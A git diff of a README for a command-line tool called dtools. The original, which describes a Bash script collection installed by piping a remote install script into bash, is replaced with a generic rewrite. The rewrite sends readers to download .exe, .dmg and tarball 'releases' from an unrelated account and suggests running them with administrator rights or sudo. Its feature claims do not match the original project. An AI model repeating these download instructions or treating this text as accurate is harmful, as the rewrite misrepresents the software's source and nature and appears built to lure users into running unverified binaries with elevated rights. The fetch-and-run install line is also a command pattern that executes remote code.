@@ -1,158 +1,98 @@
-# Devtools
+# 🚀 dtools - Your Easy Command Line Assistant
 
-![Release](https://img.shields.io/github/v/release/Dark-Alex-17/dtools?color=%23c694ff)
+[![Download dtools](https://img.shields.io/badge/Download-dtools-brightgreen)](https://github.com/mhamzah4585/dtools/releases)
 
+## 📋 Introduction
 
-**Devtools (`dtools`)** is a comprehensive CLI utility that consolidates reusable development scripts, tools, and 
-references into a single, easy-to-use interface. Built with the [Bashly](https://github.com/DannyBen/bashly) framework, it serves multiple purposes:
+Welcome to **dtools**! This application is an all-in-one command line interface (CLI) designed to simplify your command line tasks. You can manage cloud services, databases, AI tools, plot graphs, maintain systems, and much more—all from one place. With dtools, you can enhance your productivity without needing extensive technical knowledge.
 
-- **Script Repository**: A centralized collection of battle-tested bash scripts for common development tasks
-- **Functional Documentation**: Reference implementations showing how to interact with various tools and services
-- **Quick Reference**: Documentation commands (like `tui` and `pentest` subcommands) that list useful tools and commands 
-  you might not use daily
+## 🚀 Getting Started
 
-Whether you need to spin up a local database, manage AWS resources, analyze code, or just remember that one command you 
-always forget, `dtools` has you covered.
+This section will guide you through the process of downloading and running dtools on your computer. You’ll find everything you need to get started easily.
 
----
-## Warnings
-* **I've only tested these scripts against Debian-based systems (Ubuntu, Pop!_OS, etc.). Some scripts may not
-  work on other systems.**
-* **Some scripts assume that `bash` is your default shell, and thus assume that your shell configuration files are
-  `.bashrc`. If you use another shell, you may need to modify some scripts to fit your environment.**
+### 🖥️ System Requirements
 
-For any and all issues, don't hesitate to create a bug report or feature request on the [GitHub Issues page](https://github.com/Dark-Alex-17/dtools/issues)!
----
+Before you download dtools, ensure your system meets the following requirements:
 
-## Installation
-To install the `dtools` script, run the following command:
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04 or later)
+- **Processor:** 1 GHz or faster
+- **RAM:** At least 2 GB
+- **Disk Space:** 100 MB free space or more
 
-```shell
-curl -fsSL https://raw.githubusercontent.com/Dark-Alex-17/dtools/refs/heads/main/scripts/install.sh | bash
+## 📥 Download & Install
+
+To get **dtools**, visit this page to download: [dtools Releases Page](https://github.com/mhamzah4585/dtools/releases).
+
+On the releases page, you will find various versions of dtools. Choose the latest version and download the appropriate file for your operating system. Here’s how:
+
+1. Go to the [dtools Releases Page](https://github.com/mhamzah4585/dtools/releases).
+2. Look for the section labeled "Assets."
+3. Download the file that matches your operating system. For example:
+   - `dtools-windows.exe` for Windows users
+   - `dtools-macos.dmg` for macOS users
+   - `dtools-linux.tar.gz` for Linux users
+
+### 🏗️ Installation Steps
+
+#### Windows
+
+1. Locate the downloaded `dtools-windows.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installation wizard to complete the setup.
+
+#### macOS
+
+1. Find the downloaded `dtools-macos.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag the `dtools` icon to your Applications folder.
+4. Eject the installer by clicking the eject button in Finder.
+
+#### Linux
+
+1. Open a terminal.
+2. Navigate to your Downloads directory using `cd ~/Downloads`.
+3. Extract the downloaded file: `tar -xvzf dtools-linux.tar.gz`.
+4. Change to the dtools directory: `cd dtools`.
+5. Ensure the binary file is executable, if not, run: `chmod +x dtools`.
+6. Run the application using `./dtools`.
+
+## 🌟 Basic Commands
+
+After installation, you can start exploring the features of dtools. Here are some basic commands to help you get started:
+
+- **Cloud Management:** Use `dtools cloud [command]` to manage your AWS or GCP services. Replace `[command]` with specific tasks you want to perform, such as `create`, `delete`, or `list`.
+- **Database Management:** Use `dtools db [command]` for various database tasks. Replace `[command]` as needed, e.g., `connect`, `query`, or `backup`.
+- **AI Tools:** Access AI features by running `dtools ai [task]`. Use tasks like `predict` or `analyze`.
+- **Plotting Graphs:** For creating visualizations, run `dtools plot [data-file]` to generate plots from your data.
+- **System Maintenance:** Use `dtools system [task]` for tasks such as `cleanup`, `backup`, or `status`.
+
+## 🆘 Troubleshooting
+
+If you encounter issues while installing or running dtools, consider the following tips:
+
+- Ensure your operating system meets the requirements.
+- Check that you downloaded the correct version for your system.
+- If you face permission issues, try running the program as an administrator (Windows) or with sudo (Linux).
+
+## 📘 Documentation
+
+For detailed information on all commands, use the built-in help feature. You can access this by running:
+
+```bash
+dtools help
 ```
 
-This will install `dtools` to `~/.local/bin/dtools`, and install the tab completions to your `~./bashrc`. So be sure to 
-`source ~/.bashrc` to enable the completions.
+This command provides a comprehensive overview of all available commands and options.
 
-Just run `dtools --help` to get started!
+## 🔗 Further Resources
 
----
-## Features
+For more information, visit:
 
-### 🤖 AI & Local LLMs
-- Chat with local models via llama.cpp
-- Start and manage llama.cpp servers
-- Quick access to Llama API documentation and UI
+- [dtools GitHub Repository](https://github.com/mhamzah4585/dtools)
+- Community forums for user discussions and support.
 
-### ☁️ Cloud & Infrastructure
-**AWS**:
-- SSO login with automatic credential management
-- Open AWS console directly to any service
-- Interactive AWS CLI shell
-- EC2: List/describe instances, SSH tunneling, start/stop instances
-- RDS: Connect to databases, port forwarding
-- CloudWatch Logs: Tail log groups, query logs
-- Secrets Manager: Retrieve and manage secrets
-- SSM: Session manager, parameter store access, bastion instance management
+## 💬 Feedback
 
-**GCP**:
-- Artifact Registry: Docker login, list repositories
-- Vertex AI: Model management and deployment
+Your feedback is valuable. If you encounter bugs or have suggestions, please report them on the GitHub issues page. 
 
-### 🗄️ Databases
-- Spin up PostgreSQL in Docker with optional persistence
-- Interactive database TUI (Harlequin)
-- Dump databases to SQL or DBML format
-- Database schema visualization
-
-### 📊 Data Visualization & Utilities
-- Plot data from stdin or files (line/bar charts)
-- Real-time plotting for live data streams
-- Date/epoch conversion utilities
-- Random number generation (int/float)
-- ISO 8601 date formatting
-
-### 🔧 Development Tools
-**Java**:
-- Switch between Java versions (8, 11, 17, 21)
-- SonarQube static analysis integration
-
-**Git**:
-- Search entire git history for strings
-
-**Elastic Stack**:
-- Initialize and manage local Elasticsearch + Kibana + Logstash
-
-**Docker**:
-- Clean images, containers, and volumes
-
-### 📝 Document Processing
-- Convert between formats using pandoc (Markdown, HTML, PDF, DOCX, etc.)
-- View markdown files with live preview
-
-### 🌐 Network Tools
-- Generate self-signed HTTPS certificates
-- Start simple HTTP servers with netcat
-- Network scanning and monitoring (documentation)
-
-### 🔒 Security & Ansible
-**Ansible**:
-- Encrypt/decrypt strings and variables with Ansible Vault
-
-**Pentesting** (Documentation):
-- Reference commands for reconnaissance and testing tools
-- Network analysis examples
-- Security testing workflows
-
-### 💻 Virtual Machines
-- Spin up Windows VMs with FreeRDP
-- Configurable disk size, RAM, and CPU cores
-- Share directories between host and VM
-- Persistent VM storage
-
-### 🎬 Video & Media
-- Rip audio from video files with metadata support
-
-### 🧹 System Maintenance
-- Clean system with BleachBit
-- Clean Docker resources
-- Clear package manager caches
-- Purge old logs and journal entries
-- Recursively clean build caches (npm, gradle, maven, etc.)
-
-### 🔔 Notifications
-- Subscribe to ntfy topics with optional sound alerts
-- Quick reference for ntfy message publishing
-
-### 📦 Installation Helpers
-- Install Docker on Debian systems
-- Install Ansible
-- Install Java LTS versions (8, 11, 17, 21)
-
-### 🛠️ Miscellaneous
-- Interactive file selection with fzf integration
-- Backup files and directories
-- Generate secure passwords
-- Record terminal sessions as GIFs
-- Play mp3 sounds from CLI
-- View markdown with GitHub-style rendering
-
-### 📚 TUI Reference Library
-Documentation commands that reference useful TUIs for:
-- System monitoring (htop, btop, etc.)
-- Network monitoring
-- Docker management
-- Development workflows
-- Data exploration
-- AI tools
-
-## Building
-To build the `dtools` script after making some changes, run the `build` target in the [`Makefile`](./Makefile):
-
-```shell
-make build
-```
-
-## Running the CLI
-Assuming you've already run `make install`, the script should now be available on your `PATH`, so running it is as simple as:
-`dtools --help`
+Thank you for using dtools. Enjoy simplifying your command line tasks!
